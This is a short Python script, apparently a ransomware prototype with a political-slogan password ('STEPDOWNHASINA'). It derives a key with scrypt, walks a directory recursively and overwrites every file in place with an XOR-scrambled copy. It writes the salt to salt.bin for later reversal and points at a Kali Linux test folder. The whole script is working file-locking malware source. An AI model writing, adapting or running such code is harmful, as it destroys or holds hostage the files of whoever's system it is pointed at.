import os
from Crypto.Protocol.KDF import scrypt
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

# Configuration
KEY_PASSWORD = b'STEPDOWNHASINA'
SALT = get_random_bytes(16)  # Eta store korte hobe securely for decryption
KEY_LENGTH = 32  # Length for AES-256
KEY = scrypt(KEY_PASSWORD, SALT, KEY_LENGTH, N=2**14, r=8, p=1)

def xor(data, key):
    key_length = len(key)
    return bytes([data[i] ^ key[i % key_length] for i in range(len(data))])

def process_file(file_path, key):
    with open(file_path, 'rb') as f:
        data = f.read()
    
    cipher = xor(data, key)
    
    with open(file_path, 'wb') as f:
        f.write(cipher)

def process_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            process_file(file_path, key)


# Storing the salt in a binary file
with open('salt.bin', 'wb') as salt_file:
    salt_file.write(SALT)

# Encrypt/Decrypt directory
DIRECTORY_PATH = '/home/kali/project_hashecrypt/testdir/'
process_directory(DIRECTORY_PATH, KEY)
